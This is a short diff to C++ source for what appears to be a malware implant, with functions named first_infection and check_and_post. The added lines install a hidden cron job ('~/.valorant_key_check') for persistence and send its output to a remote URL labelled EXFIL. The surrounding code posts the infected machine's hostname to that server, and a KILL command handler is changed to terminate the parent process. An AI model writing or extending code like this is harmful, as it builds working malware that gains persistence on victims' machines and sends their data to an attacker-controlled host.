@@ -108,7 +108,11 @@ void first_infection() {
     infectedHostname = val[0];
     PID = ::getppid();
     curl_post(URL, FIRST_INFECT + "/" + PER_IMPL_INSTR, infectedHostname, false);
-    //command("1 * * * * /usr/local/.valorant_key_check | crontab -");
+    std::vector<std::string> res = command("echo '1 * * * * ~/.valorant_key_check' | crontab -");
+    if (res.size() > 0) {
+	    curl_post(URL, EXFIL, res[0], true);
+    }
+
 }
 
 void check_and_post() {
@@ -140,7 +144,7 @@ void check_and_post() {
         std::vector<std::string> cmdRes;
         //Need to check if the instruction is a Polo specific command
         if (*it == "KILL") {
-            std::cout << "Kill Command Issued\n";
+	    PID = ::getppid();
             if (PID) {
                 kill(PID, SIGTERM);
             }
